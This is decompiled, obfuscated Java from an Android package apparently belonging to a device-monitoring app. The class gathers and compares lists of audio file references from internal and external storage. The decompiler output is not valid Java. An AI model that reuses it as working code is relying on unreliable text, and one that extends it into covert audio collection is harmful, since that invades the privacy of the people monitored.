package com.vvt.capture.audio.a;

import com.vvt.base.capture.f;
import com.vvt.base.capture.g;
import com.vvt.capture.audio.AudioReference;
import java.util.ArrayList;
import java.util.Collection;
import java.util.HashMap;
import java.util.List;

public class b
  implements f
{
  private static final boolean a = com.vvt.ak.a.a;
  
  public g a()
  {
    Object localObject1 = new java/util/ArrayList;
    ((ArrayList)localObject1).<init>();
    Object localObject2 = new java/util/ArrayList;
    ((ArrayList)localObject2).<init>();
    Object localObject3 = a.a();
    boolean bool1 = com.vvt.ag.b.a((String)localObject3);
    if (!bool1) {
      localObject1 = a.a((String)localObject3);
    }
    localObject3 = a.b();
    bool1 = com.vvt.ag.b.a((String)localObject3);
    if (!bool1) {
      localObject2 = a.a((String)localObject3);
    }
    boolean bool2 = a;
    if (bool2) {}
    bool2 = a;
    if (bool2) {}
    localObject3 = new java/util/HashMap;
    ((HashMap)localObject3).<init>();
    ((HashMap)localObject3).put("external", localObject1);
    ((HashMap)localObject3).put("internal", localObject2);
    localObject1 = new com/vvt/capture/audio/AudioReference;
    ((AudioReference)localObject1).<init>();
    ((AudioReference)localObject1).setReference((HashMap)localObject3);
    return (g)localObject1;
  }
  
  public List a(int paramInt)
  {
    boolean bool1 = a;
    if (bool1) {}
    bool1 = a;
    if (bool1) {}
    bool1 = false;
    Object localObject = null;
    ArrayList localArrayList1 = new java/util/ArrayList;
    localArrayList1.<init>();
    ArrayList localArrayList2 = new java/util/ArrayList;
    localArrayList2.<init>();
    boolean bool3 = a;
    if (bool3) {}
    String str = a.a();
    boolean bool6 = com.vvt.ag.b.a(str);
    if (!bool6)
    {
      localObject = a.a(str, paramInt);
      localObject = a.a(str, localArrayList2, (List)localObject);
      if (localObject != null)
      {
        int j = ((List)localObject).size();
        if (j > 0) {
          localArrayList1.addAll((Collection)localObject);
        }
      }
    }
    boolean bool4 = a;
    if (bool4) {}
    int k = ((List)localObject).size();
    if (k < paramInt)
    {
      boolean bool5 = a;
      if (bool5) {}
      str = a.b();
      bool6 = com.vvt.ag.b.a(str);
      if (!bool6)
      {
        int i = ((List)localObject).size();
        i = paramInt - i;
        localObject = a.a(str, i);
        localObject = a.a(str, localArrayList2, (List)localObject);
        if (localObject != null)
        {
          int m = ((List)localObject).size();
          if (m > 0) {
            localArrayList1.addAll((Collection)localObject);
          }
        }
      }
      bool2 = a;
      if (!bool2) {}
    }
    boolean bool2 = a;
    if (bool2) {}
    return localArrayList1;
  }
  
  public List a(g paramg1, g paramg2)
  {
    boolean bool = a;
    if (bool) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    bool = paramg1 instanceof AudioReference;
    if (bool)
    {
      bool = paramg2 instanceof AudioReference;
      if (bool)
      {
        paramg1 = (AudioReference)paramg1;
        HashMap localHashMap1 = paramg1.getReference();
        paramg2 = (AudioReference)paramg2;
        HashMap localHashMap2 = paramg2.getReference();
        new ArrayList();
        new ArrayList();
        Object localObject = new java/util/ArrayList;
        ((ArrayList)localObject).<init>();
        bool = a;
        if (bool) {}
        String str = a.b();
        bool = com.vvt.ag.b.a(str);
        List localList;
        int i;
        if (!bool)
        {
          localObject = (List)localHashMap1.get("internal");
          localList = (List)localHashMap2.get("internal");
          localObject = a.a(str, (List)localObject, localList);
          if (localObject != null)
          {
            i = ((List)localObject).size();
            if (i > 0) {
              localArrayList.addAll((Collection)localObject);
            }
          }
        }
        bool = a;
        if (bool) {}
        bool = a;
        if (bool) {}
        str = a.a();
        bool = com.vvt.ag.b.a(str);
        if (!bool)
        {
          localObject = (List)localHashMap1.get("external");
          localList = (List)localHashMap2.get("external");
          localObject = a.a(str, (List)localObject, localList);
          if (localObject != null)
          {
            i = ((List)localObject).size();
            if (i > 0) {
              localArrayList.addAll((Collection)localObject);
            }
          }
        }
        bool = a;
        if (!bool) {}
      }
    }
    bool = a;
    if (bool) {}
    return localArrayList;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/audio/a/removeFromPath.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */